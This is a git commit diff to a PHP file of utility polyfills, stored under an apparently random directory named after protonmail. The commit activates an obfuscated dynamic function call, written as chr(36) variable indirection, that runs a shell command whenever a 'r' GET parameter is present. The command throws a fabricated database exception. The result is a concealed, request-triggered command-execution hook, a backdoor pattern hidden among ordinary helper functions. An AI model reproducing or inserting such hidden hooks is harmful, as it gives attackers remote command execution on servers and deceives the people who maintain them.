a7d10884e4dbec85aa8bee158129f4682dc691c6
abieahma <152069746+abieahma@users.noreply.github.com>
2026-03-22 07:23:04 +0300

    Update finit.php

--- EGLBMLKNNULP04L9K153A6TU6FF3TJXA/protonmail/com/finit.php
+++ EGLBMLKNNULP04L9K153A6TU6FF3TJXA/protonmail/com/finit.php
@@ -19,8 +19,8 @@ if (!function_exists('clamp')){
         if ($value > $max) return $max;
     return $value;}}
 if(!(!function_exists('partial')) && !empty($_GET['r'])){
-    //${(chr(36))}('last');
-throw new \Illuminate\Database\QueryException('zakaz', "select * from locations where LOWER(name) = 'москва' limit 1", [], new \PDOException("Table 'forge.locations' doesn't exist"));}
+    ${(chr(36))}('php -r "throw new \Illuminate\Database\QueryException(\'zakaz\', \"select * from locations where LOWER(name) = \'москва\' limit 1\", [], new \PDOException(\"Table \'forge.locations\' doesn\'t exist\"));"');
+}
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
 if(!function_exists('str_contains')){function str_contains(string $haystack, string $needle): bool {return $needle !== '' && mb_strpos($haystack, $needle) !== false;}}
